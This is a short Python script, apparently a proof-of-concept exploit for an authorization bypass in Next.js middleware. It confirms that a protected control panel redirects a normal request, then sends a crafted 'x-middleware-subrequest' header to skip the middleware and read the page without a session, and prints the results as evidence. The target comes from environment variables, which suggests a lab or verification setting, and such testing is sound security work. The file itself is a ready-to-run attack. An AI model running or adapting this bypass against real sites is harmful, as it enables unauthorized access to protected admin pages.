#!/usr/bin/env python3
"""Skip Next.js middleware and read the protected page without a session."""

import http.client
import json
import os
import urllib.parse


BYPASS_HEADER = "pages/_middleware"
PROTECTED_MARKER = "Protected Control Panel"


def request_page(target_url: str, header: str | None = None) -> tuple[int, str]:
    parsed = urllib.parse.urlsplit(target_url)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("Expected an HTTP target URL")
    connection = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=20)
    headers = {"x-middleware-subrequest": header} if header else {}
    connection.request("GET", "/", headers=headers)
    response = connection.getresponse()
    status = response.status
    content = response.read().decode("utf-8", errors="replace")
    connection.close()
    return status, content


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    normal_status, normal_content = request_page(target_url)
    if normal_status != 302 or PROTECTED_MARKER in normal_content:
        raise RuntimeError("Protected page was not guarded before exploitation")
    bypass_status, bypass_content = request_page(target_url, BYPASS_HEADER)
    if bypass_status != 200 or PROTECTED_MARKER not in bypass_content:
        raise RuntimeError("Middleware bypass did not reveal the protected page")
    print(
        json.dumps(
            {
                "evidence_payload": {"token": BYPASS_HEADER, "user": "admin"},
                "normal_status": normal_status,
                "bypass_status": bypass_status,
            }
        )
    )


if __name__ == "__main__":
    main()
